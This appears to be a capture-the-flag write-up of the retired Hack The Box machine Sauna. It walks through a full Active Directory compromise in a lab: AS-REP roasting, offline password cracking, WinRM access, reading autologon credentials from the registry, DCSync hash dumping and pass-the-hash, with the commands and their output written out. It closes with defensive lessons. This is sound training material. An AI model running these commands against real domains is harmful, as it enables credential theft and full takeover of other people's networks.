---
title: "HTB: Sauna · AS-REP Roasting to DCSync on a read-only foothold"
date: 2026-09-10
draft: false
tags: ["hackthebox", "active-directory", "windows", "privilege-escalation", "asreproast", "dcsync"]
summary: "A retired easy Windows box where the whole chain grows out of a corporate website: employee names become usernames, one account has Kerberos pre-authentication disabled, and an autologon password in the registry leads to a DCSync and full domain compromise."
---

## Overview

Sauna is a retired easy-difficulty Windows machine from Hack The Box, and it's a clean example of how an Active Directory attack can start from nothing more than a company's public website. The path is:

1. **Employee names** scraped from the corporate site are turned into candidate domain usernames.
2. **AS-REP Roasting** finds one account (`fsmith`) with Kerberos pre-authentication disabled, which hands us a crackable hash without any credentials.
3. Cracking that hash gives a foothold over WinRM.
4. An **autologon password stored in cleartext in the registry** gives a service account.
5. That service account has **DCSync** rights, which dumps the Administrator hash for a pass-the-hash to full domain compromise.

Target: `10.129.60.189`, a Windows Server Domain Controller for the domain `EGOTISTICAL-BANK.LOCAL`.

## Enumeration

Full TCP scan with default scripts and version detection:

```bash
nmap -sC -sV -p- -oN nmap-sauna.txt 10.129.60.189
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0  (title: Egotistical Bank)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL)
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
9389/tcp open  mc-nmf        .NET Message Framing
...
```

The Kerberos/LDAP/SMB combination marks this as a Domain Controller, and WinRM (5985) is open, so valid credentials for the right user get us an interactive shell. Unlike a box that leaks its user list over an anonymous null session, here the interesting surface is the **IIS web server on port 80**. A corporate site almost always has an "about" or "team" page, and those employee names are the raw material for domain usernames.

The site's team page lists six employees:

```
Fergus Smith, Shaun Coins, Sophie Driver, Bowie Taylor, Hugo Bear, Steven Kerb
```

## Foothold · AS-REP Roasting

We don't know the company's username convention, so we generate the common formats (`fsmith`, `fergus.smith`, `fergussmith`, `smithf`, ...) for every employee into a `users.txt`, then test them all.

The attack is **AS-REP Roasting**. Kerberos normally requires pre-authentication (proving you know the password before the DC issues anything). If an account has that turned off ("Do not require Kerberos preauthentication"), anyone can request an AS-REP ticket encrypted with that account's password hash, with no credentials at all, then crack it offline. `GetNPUsers.py` tests the whole list and returns a hash for any vulnerable account:

```bash
impacket-GetNPUsers -no-pass -dc-ip 10.129.60.189 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt
```

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:aed2d705...
```

One hit: **fsmith**, which also confirms the convention is first-initial + surname. Crack it offline. The hash is AS-REP (hashcat mode 18200); since the attack VM has no GPU, John the Ripper on CPU does the job:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# fsmith ... Thestrokes23
```

The credential is valid and fsmith is in the Remote Management Users group, so WinRM is available:

```bash
netexec winrm 10.129.60.189 -u fsmith -p 'Thestrokes23'
# (Pwn3d!)

evil-winrm -i 10.129.60.189 -u fsmith -p 'Thestrokes23'
```

```
*Evil-WinRM* PS> type C:\Users\FSmith\Desktop\user.txt
352fd5ef************************a2
```

User flag captured.

## Privilege escalation · autologon to DCSync

On a Domain Controller, the goal is stored credentials or replication privileges. A classic place Windows leaves a password in cleartext is the **autologon configuration in the registry**: if the machine is set to log in automatically, it stores the username and password under `Winlogon`.

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

```
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

The `DefaultUserName` reads `svc_loanmanager`, but the actual domain account is named `svc_loanmgr`, a small gotcha worth checking rather than assuming:

```bash
netexec smb 10.129.60.189 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
# [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr (valid)
```

This service account has the `DS-Replication-Get-Changes-All` right, the same privilege domain controllers use to sync with each other. With it we can ask the DC to replicate the hashes of every account, Administrator included, without being an admin. This is **DCSync**:

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.60.189
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

(The `rpc_s_access_denied` on the remote-registry method at the start is harmless; the DRSUAPI replication method is the one that matters, and it succeeds.)

With the Administrator NTLM hash we authenticate by **pass-the-hash**, no password needed:

```bash
evil-winrm -i 10.129.60.189 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
9c1171ef************************c4
```

Root flag captured. Full domain compromise.

## Lessons learned

Sauna chains together mistakes that show up constantly in real assessments:

- **Public employee names are attacker input.** A team page is convenient for customers and equally convenient for building a domain user list. It can't always be avoided, but it means everything downstream (Kerberos hardening, password policy) has to hold.
- **Kerberos pre-authentication should never be disabled.** Any account with it off is an unauthenticated, offline-crackable hash for the taking. Audit the `DONT_REQUIRE_PREAUTH` flag across the domain.
- **Never enable autologon on a server**, least of all a Domain Controller. It stores the password in cleartext in a registry key any authenticated user can read.
- **Treat DCSync rights as tier-0.** Replication privileges on a service account are effectively Domain Admin. Audit who holds `DS-Replication-Get-Changes` and `-All`.

*Flags are partially redacted, per convention.*
